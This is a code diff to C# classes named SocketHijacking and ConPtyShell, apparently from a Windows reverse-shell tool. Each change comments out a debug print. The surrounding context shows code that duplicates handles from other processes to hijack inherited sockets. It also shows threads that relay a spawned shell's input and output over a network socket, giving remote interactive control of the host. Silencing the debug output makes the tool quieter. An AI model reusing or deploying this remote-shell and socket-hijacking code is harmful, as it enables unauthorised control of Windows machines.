@@ -456,13 +456,13 @@ public static class SocketHijacking
         result = WSAIoctl1(socket, SIO_TCP_INFO, ref tcpInfoVersion, Marshal.SizeOf(tcpInfoVersion), tcpInfoPtr, tcpInfoSize, ref bytesReturned, IntPtr.Zero, IntPtr.Zero);
         if (result != 0)
         {
-            Console.WriteLine("debug: WSAIoctl1 failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
+            // Console.WriteLine("debug: WSAIoctl1 failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
             ret = false;
         }
         else
         {
             TCP_INFO_v0 tcpInfoV0 = (TCP_INFO_v0)Marshal.PtrToStructure(tcpInfoPtr, typeof(TCP_INFO_v0));
-            Console.WriteLine("debug: Socket handle 0x" + socket.ToString("X4") + " is in tcpstate " + tcpInfoV0.State.ToString() + " total bytes received: " + tcpInfoV0.BytesIn.ToString() + " total bytes sent: " + tcpInfoV0.BytesOut.ToString());
+            // Console.WriteLine("debug: Socket handle 0x" + socket.ToString("X4") + " is in tcpstate " + tcpInfoV0.State.ToString() + " total bytes received: " + tcpInfoV0.BytesIn.ToString() + " total bytes sent: " + tcpInfoV0.BytesOut.ToString());
             if (tcpInfoV0.State == TcpState.SynReceived || tcpInfoV0.State == TcpState.Established)
                 ret = true;
         }
@@ -562,7 +562,7 @@ public static class SocketHijacking
             {
                 if (deadlockCheckHelperObj.CheckDeadlockDetected(dupHandle))
                 { // this will avoids deadlocks on special named pipe handles
-                    Console.WriteLine("debug: Deadlock detected");
+                    // Console.WriteLine("debug: Deadlock detected");
                     CloseHandle(dupHandle);
                     continue;
                 }
@@ -622,7 +622,7 @@ public static class SocketHijacking
                 (sockaddrTargetProcess.sin_addr == sockaddrParentProcess.sin_addr && sockaddrTargetProcess.sin_port == sockaddrParentProcess.sin_port)
                )
             {
-                Console.WriteLine("debug: found inherited socket! handle --> 0x" + duplicatedParentSocket.ToString("X4"));
+                // Console.WriteLine("debug: found inherited socket! handle --> 0x" + duplicatedParentSocket.ToString("X4"));
                 inherited = true;
                 closesocket(duplicatedParentSocket);
                 break;
@@ -644,7 +644,7 @@ public static class SocketHijacking
         ntStatus = NtCreateEvent(ref sockEvent, EVENT_ALL_ACCESS, IntPtr.Zero, SynchronizationEvent, false);
         if (ntStatus != NTSTATUS_SUCCESS)
         {
-            Console.WriteLine("debug: NtCreateEvent failed with error code 0x" + ntStatus.ToString("X8")); ;
+            // Console.WriteLine("debug: NtCreateEvent failed with error code 0x" + ntStatus.ToString("X8")); ;
             return ret;
         }
         IO_STATUS_BLOCK IOSB = new IO_STATUS_BLOCK();
@@ -659,7 +659,7 @@ public static class SocketHijacking
 
         if (ntStatus != NTSTATUS_SUCCESS)
         {
-            Console.WriteLine("debug: NtDeviceIoControlFile failed with error code 0x" + ntStatus.ToString("X8")); ;
+            // Console.WriteLine("debug: NtDeviceIoControlFile failed with error code 0x" + ntStatus.ToString("X8")); ;
             return ret;
         }
         if ((contextData.SharedData.CreationFlags & WSA_FLAG_OVERLAPPED) != 0) ret = true;
@@ -1138,7 +1138,7 @@ public static class ConPtyShell
             readSuccess = ReadFile(OutputPipeRead, bytesToWrite, (uint)bufferSize, out dwBytesRead, IntPtr.Zero);
             bytesSent = send(shellSocket, bytesToWrite, bufferSize, 0);
         } while (bytesSent > 0 && readSuccess);
-        Console.WriteLine("debug: bytesSent = " + bytesSent + " WSAGetLastError() = " + WSAGetLastError().ToString());
+        // Console.WriteLine("debug: bytesSent = " + bytesSent + " WSAGetLastError() = " + WSAGetLastError().ToString());
     }
 
     private static Thread StartThreadReadPipeWriteSocket(IntPtr OutputPipeRead, IntPtr shellSocket)
@@ -1167,7 +1167,7 @@ public static class ConPtyShell
             nBytesReceived = recv(shellSocket, bytesReceived, bufferSize, 0);
             writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);
         } while (nBytesReceived > 0 && writeSuccess);
-        Console.WriteLine("debug: nBytesReceived = " + nBytesReceived + " WSAGetLastError() = " + WSAGetLastError().ToString());
+        // Console.WriteLine("debug: nBytesReceived = " + nBytesReceived + " WSAGetLastError() = " + WSAGetLastError().ToString());
         TerminateProcess(hChildProcess, 0);
     }
 
